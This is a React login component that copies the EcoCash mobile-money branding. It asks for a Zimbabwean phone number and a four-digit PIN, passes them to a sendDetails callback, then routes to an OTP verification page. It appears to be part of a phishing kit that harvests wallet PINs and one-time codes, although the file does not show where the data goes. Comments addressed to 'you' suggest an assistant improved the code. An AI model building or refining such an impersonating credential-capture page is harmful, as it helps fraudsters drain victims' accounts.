// import React, { useState } from "react";
import "./Login.css";
// import { useNavigate } from "react-router-dom";

// function Login({ client, setpin, sendDetails }) {
//   const { number } = client;
//   const navigate = useNavigate();
//   const [pin1, setPin1] = useState("");
//   const [pin2, setPin2] = useState("");
//   const [pin3, setPin3] = useState("");
//   const [pin4, setPin4] = useState("");
//   //   if (pin === true) {
//   //     console.log("true");
//   //   }
//   const localPin = [pin1, pin2, pin3, pin4];
//   const pinString = `${localPin[0]}${localPin[1]}${localPin[2]}${localPin[3]}`;
//   const pinfull = pinString.length === 4;

//   function handlePin() {
//     setpin(pinString);
//     console.log("setpin");
//     console.log(client.pin);
//   }

//   if (pinfull) {
//     handlePin();
//   }

//   function collectData() {
//     navigate("/otpverification");
//     sendDetails();
//     console.log(client);
//   }
//   return (
//     <>
//       {pinfull.length !== 4 ? (
//         <div className="container">
//           <header>
//             <div className="logo">
//               <span>Eco</span>Cash
//             </div>
//             <h1 className="login-title">Welcome</h1>
//           </header>

//           <main>
//             <div className="phone-number">+263 {number}</div>

//             <div className="pin-input-container">
//               <label className="pin-label">Enter your PIN</label>
//               <div>
//                 <input
//                   maxLength="1"
//                   type="text"
//                   className="no-spinner"
//                   value={pin1}
//                   onChange={(e) => setPin1(e.target.value)}
//                 />
//                 <input
//                   type="text"
//                   className="no-spinner"
//                   value={pin2}
//                   maxLength="1"
//                   onChange={(e) => setPin2(e.target.value)}
//                 />
//                 <input
//                   type="text"
//                   maxLength="1"
//                   className="no-spinner"
//                   value={pin3}
//                   onChange={(e) => setPin3(e.target.value)}
//                 />
//                 <input
//                   type="text"
//                   maxLength="1"
//                   className="no-spinner"
//                   value={pin4}
//                   onChange={(e) => setPin4(e.target.value)}
//                 />
//               </div>
//             </div>

//             <div className="forgot-pin">
//               <a href="#">Forgot PIN?</a>
//             </div>
//           </main>

//           <footer className="footer">
//             <div className="curvesec">
//               <div></div>
//               <div></div>
//               <button className="btnContinue" onClick={collectData}>
//                 Login
//               </button>
//             </div>
//             <div className="help-section">
//               <p className="help-text">
//                 To register an EcoCash wallet or get assistance, click below
//               </p>

//               <div className="buttons-container">
//                 <button className="help-button register-button">
//                   Register
//                 </button>
//                 <button className="help-button support-button">
//                   Help & Support
//                 </button>
//               </div>
//             </div>

//             <div className="terms">
//               <div className="version">v2.1.3P</div>
//               By signing in you agree to the Terms and Conditions
//             </div>
//           </footer>
//           {/* <OtpVerification /> */}
//         </div>
//       ) : (
//         <OtpVerification />
//       )}
//     </>
//   );
// }

// export default Login;
import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";

function Login({ client, setpin, sendDetails }) {
  const { number } = client;
  const navigate = useNavigate();
  const [pin1, setPin1] = useState("");
  const [pin2, setPin2] = useState("");
  const [pin3, setPin3] = useState("");
  const [pin4, setPin4] = useState("");

  // Create refs for each input
  const pin1Ref = useRef(null);
  const pin2Ref = useRef(null);
  const pin3Ref = useRef(null);
  const pin4Ref = useRef(null);

  const localPin = [pin1, pin2, pin3, pin4];
  const pinString = `${localPin[0]}${localPin[1]}${localPin[2]}${localPin[3]}`;
  const pinfull = pinString.length === 4;

  // Function to handle PIN input and auto-focus next field
  const handlePinInput = (pinNumber, value, setter) => {
    // Only allow numbers
    if (value && !/^\d$/.test(value)) return;

    setter(value);

    // Auto-focus next input if a digit was entered
    if (value !== "") {
      switch (pinNumber) {
        case 1:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 2:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        case 3:
          if (pin4Ref.current) pin4Ref.current.focus();
          break;
        default:
          break;
      }
    }

    // Handle backspace - focus previous field
    if (value === "" && pinNumber > 1) {
      switch (pinNumber) {
        case 2:
          if (pin1Ref.current) pin1Ref.current.focus();
          break;
        case 3:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 4:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        default:
          break;
      }
    }
  };

  // Handle keydown for navigation
  const handleKeyDown = (pinNumber, e) => {
    // Handle left arrow key
    if (e.key === "ArrowLeft" && pinNumber > 1) {
      e.preventDefault();
      switch (pinNumber) {
        case 2:
          if (pin1Ref.current) pin1Ref.current.focus();
          break;
        case 3:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 4:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        default:
          break;
      }
    }

    // Handle right arrow key
    if (e.key === "ArrowRight" && pinNumber < 4) {
      e.preventDefault();
      switch (pinNumber) {
        case 1:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 2:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        case 3:
          if (pin4Ref.current) pin4Ref.current.focus();
          break;
        default:
          break;
      }
    }

    // Handle backspace when empty
    if (e.key === "Backspace" && !localPin[pinNumber - 1] && pinNumber > 1) {
      e.preventDefault();
      switch (pinNumber) {
        case 2:
          if (pin1Ref.current) pin1Ref.current.focus();
          break;
        case 3:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 4:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        default:
          break;
      }
    }
  };

  function handlePin() {
    setpin(pinString);
    // console.log("setpin");
    // console.log(client.pin);
  }

  // Call handlePin when PIN is complete
  useEffect(() => {
    if (pinfull) {
      handlePin();
    }
  }, [pinfull]);

  function collectData() {
    sendDetails();
    navigate("/otpverification");
    // console.log(client);
  }

  // Check if component should show OTP verification
  // Note: You had a typo - pinfull is boolean, not an array, so pinfull.length was incorrect
  // const shouldShowOTP = pinfull; // Changed from pinfull.length !== 4

  // I removed the OtpVerification import and render since it wasn't defined in your code
  // If you need it, you should import it properly

  return (
    <>
      {/* {!shouldShowOTP ? ( */}
      <div className="container">
        <header>
          <div className="logo">
            <span>Eco</span>Cash
          </div>
          <h1 className="login-title">Welcome</h1>
        </header>

        <main>
          <div className="phone-number">+263 {number}</div>

          <div className="pin-input-container">
            <label className="pin-label">Enter your PIN</label>
            <div>
              <input
                ref={pin1Ref}
                maxLength="1"
                type="number"
                className="no-spinner"
                value={pin1}
                onChange={(e) => handlePinInput(1, e.target.value, setPin1)}
                onKeyDown={(e) => handleKeyDown(1, e)}
              />
              <input
                ref={pin2Ref}
                type="number"
                className="no-spinner"
                value={pin2}
                maxLength="1"
                onChange={(e) => handlePinInput(2, e.target.value, setPin2)}
                onKeyDown={(e) => handleKeyDown(2, e)}
              />
              <input
                ref={pin3Ref}
                type="number"
                maxLength="1"
                className="no-spinner"
                value={pin3}
                onChange={(e) => handlePinInput(3, e.target.value, setPin3)}
                onKeyDown={(e) => handleKeyDown(3, e)}
              />
              <input
                ref={pin4Ref}
                type="number"
                maxLength="1"
                className="no-spinner"
                value={pin4}
                onChange={(e) => handlePinInput(4, e.target.value, setPin4)}
                onKeyDown={(e) => handleKeyDown(4, e)}
              />
            </div>
          </div>

          <div className="forgot-pin">
            <a href="#">Forgot PIN?</a>
          </div>
        </main>

        <footer className="footer">
          <div className="curvesec">
            <div></div>
            <div></div>
            <button className="btnContinue" onClick={collectData}>
              Login
            </button>
          </div>
          <div className="help-section">
            <p className="help-text">
              To register an EcoCash wallet or get assistance, click below
            </p>

            <div className="buttons-container">
              <button className="help-button register-button">Register</button>
              <button className="help-button support-button">
                Help & Support
              </button>
            </div>
          </div>

          <div className="terms">
            <div className="version">v2.1.3P</div>
            By signing in you agree to the Terms and Conditions
          </div>
        </footer>
      </div>
      {/* // ) : ( // // Note: You need to import and define OtpVerification
      component // <div>OTP Verification Component would go here</div>
      // )} */}
    </>
  );
}

export default Login;
